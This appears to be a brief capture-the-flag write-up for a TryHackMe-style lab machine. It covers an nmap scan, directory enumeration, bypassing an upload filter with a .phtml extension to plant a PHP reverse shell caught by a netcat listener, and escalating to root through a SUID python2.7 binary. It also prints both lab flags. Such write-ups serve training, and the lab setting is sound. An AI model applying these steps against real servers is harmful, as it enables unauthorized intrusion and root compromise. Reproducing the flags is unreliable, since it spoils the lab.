`Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 19:29 UTC`
`Nmap scan report for 10.201.74.203`
`Host is up (0.13s latency).`
`Not shown: 65533 closed tcp ports (reset)`
`PORT   STATE SERVICE VERSION`
`22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   3072 d2:f0:3b:4a:2d:40:11:4a:b8:da:fa:3e:b1:98:99:af (RSA)`
`|   256 2b:28:35:42:06:56:fd:26:9a:d6:af:d4:d9:f0:e0:ef (ECDSA)`
`|_  256 86:20:52:71:13:dc:09:1d:b4:92:59:2c:b4:83:ae:b3 (ED25519)`
`80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))`
`|_http-title: HackIT - Home`
`|_http-server-header: Apache/2.4.41 (Ubuntu)`
`| http-cookie-flags:` 
`|   /:` 
`|     PHPSESSID:` 
`|_      httponly flag not set`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

`Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
`Nmap done: 1 IP address (1 host up) scanned in 79.17 seconds`

We can see there is an Apache on port 80.

Base url just shows "Can you root me"

If we enumerate with ffuf we will find the subdirectory /panel/ and /uploads/

We can use this for a revshell.
Inital attempt the upload doesn't allow .php so we can use an alterative file extension of .phtml

Then we go to /uploads/, start our nc -lnvp 9001 and execute it on that page to get initial foothold

You will find user.txt in /var/www/user.txt
THM{y0u_g0t_a_sh3ll}

We look at SUID binaries to see what we can use to escalate
`find` `/ -perm -u=s -``type` `f 2>``/dev/null`

We find /usr/bin/python2.7

GTFOBins shows us that to build a shell we use 
```
python -c 'import os; os.system("/bin/sh")'
```

Then to use this shell to our advantage we can use file read
python -c 'print(open("/root/root.txt").read())'

This prints the root flag of THM{pr1v1l3g3_3sc4l4t10n}

Short and sweet. Almost eJPT time!